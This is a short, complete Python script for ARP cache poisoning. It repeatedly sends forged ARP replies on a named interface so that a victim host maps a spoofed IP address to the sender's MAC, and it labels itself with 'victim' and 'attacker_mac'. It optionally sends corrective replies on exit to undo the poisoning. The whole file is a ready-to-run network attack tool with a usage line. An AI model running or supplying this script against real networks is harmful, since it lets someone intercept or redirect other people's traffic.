#!/usr/bin/env python3
"""Send a source-scoped ARP reply mapping a spoofed IP to this host."""
import fcntl
import signal
import socket
import struct
import sys
import time

if len(sys.argv) not in (5, 6):
    raise SystemExit(
        f"usage: {sys.argv[0]} IFACE VICTIM_IP SPOOF_IP VICTIM_MAC [REAL_SPOOF_MAC]")
iface, victim_ip, spoof_ip, victim_mac = sys.argv[1:5]
vmac = bytes.fromhex(victim_mac.replace(":", ""))
if len(vmac) != 6:
    raise SystemExit("VICTIM_MAC must contain exactly six bytes")
real_spoof_mac = (bytes.fromhex(sys.argv[5].replace(":", ""))
                  if len(sys.argv) == 6 else None)
if real_spoof_mac is not None and len(real_spoof_mac) != 6:
    raise SystemExit("REAL_SPOOF_MAC must contain exactly six bytes")
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((iface, 0))
my_mac = fcntl.ioctl(s.fileno(), 0x8927,
                     struct.pack("256s", iface.encode()))[18:24]
ip = socket.inet_aton


def reply(sender_mac):
    ethernet = vmac + sender_mac + struct.pack("!H", 0x0806)
    arp = (struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + sender_mac +
           ip(spoof_ip) + vmac + ip(victim_ip))
    return ethernet + arp


frame = reply(my_mac)
print("iface", iface, "victim", victim_ip, victim_mac,
      "spoof", spoof_ip, "attacker_mac", my_mac.hex(":"), flush=True)


def stop(_signum, _frame):
    raise KeyboardInterrupt


for signum in (signal.SIGINT, signal.SIGTERM, signal.SIGHUP):
    signal.signal(signum, stop)
try:
    while True:
        s.send(frame)
        time.sleep(2)
except KeyboardInterrupt:
    pass
finally:
    if real_spoof_mac is not None:
        corrective = reply(real_spoof_mac)
        for _ in range(5):
            s.send(corrective)
            time.sleep(0.2)
        print("restored", spoof_ip, real_spoof_mac.hex(":"),
              "for", victim_ip, flush=True)
